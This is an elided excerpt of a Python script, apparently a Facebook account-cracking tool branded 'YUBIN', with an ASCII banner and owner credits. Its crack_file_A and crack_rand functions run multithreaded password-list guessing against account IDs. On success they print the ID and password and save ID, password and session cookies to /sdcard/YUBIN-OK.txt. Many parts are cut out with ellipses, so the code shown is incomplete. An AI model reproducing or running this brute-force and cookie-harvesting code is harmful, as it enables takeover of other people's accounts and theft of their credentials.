...
print('\033[1;91m[\033[1;92m⊀⊁\033[1;91m] \033[1;91m⊀\33[1;92mYUBIN-HASAN\33[1;91m⊁ ')
...
logo1 = f"""{W}
 ...
 \ \ / /   _| |__ (_)_ __  
  \ V / | | | '_ \| | '_ \ 
   ...
   |_| \__,_|_.__/|_|_| |_|
\033[1;33m<><><><><><><><><<><><><><><><><><><><><><><>
 [<>] \033[1;36mOWNER   :  YUBIN DHAKAL
 [<>] \033[1;32mBROTHER :  NEXUS-404
 [<>] \033[1;34mGITHUB  :  YUBIN-XD
...
class apvroval:
    def check():
        url = "https://github.com/YUBIN-XD/short/blob/main/shot.txt"
        import mechanize
...
class Main:
    def Awm():
        ...
        elif awm in ['3']:os.system('xdg-open https://www.facebook.com/yubinxwd')
...
def Awm_File():
    ...
    with tred(max_workers=30) as My_Tanisha:
        ...
        print(f" TOTAL OK ID SAVE IN : {G}/sdcard/YUBIN-OK.txt{W}")
        print(f" TOTAL CP ID SAVE IN : {R}/sdcard/YUBIN-CP.txt{W}")
...
def crack_file_A(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r {W}[YUBIN>FILE] {loop}|03-December|{G}{len(oks)}{W}/{R}{len(cps)}')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r {G}[YUBIN-OK] {ids} | {pas}')
                open('/sdcard/YUBIN-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
...
def crack_rand(ids,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r {W}[YUBIN>RNDM] {loop}|03-December|{G}{len(oks)}{W}/{R}{len(cps)}')
    sys.stdout.flush()
    try:
        for pas in passlist:
            data = {
            ...
            if "access_token" in po:
                uid = str(po['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r {G}[YUBIN-OK] {uid} | {pas}')
                open('/sdcard/YUBIN-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
